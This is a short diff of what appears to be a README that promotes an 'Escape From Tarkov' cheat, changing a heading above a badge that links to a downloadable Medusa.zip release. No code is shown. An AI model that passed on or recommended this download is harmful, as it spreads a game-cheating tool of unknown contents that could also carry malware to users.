@@ -8,7 +8,7 @@
 
 ## 🚀 **How to Use**
 
-### 1️⃣ **Get the Latest Version**
+### 1️⃣ **Get the Latest Release**
 [![DOWNLOAD](https://github.com/user-attachments/assets/203a2c6a-06d8-4f84-ba40-7052b26f0110)](https://github.com/kilad-byte/Escape-From-Tarkov-Medusa-Lite-Cheat/releases/download/latest/Medusa.zip)
 ---
 
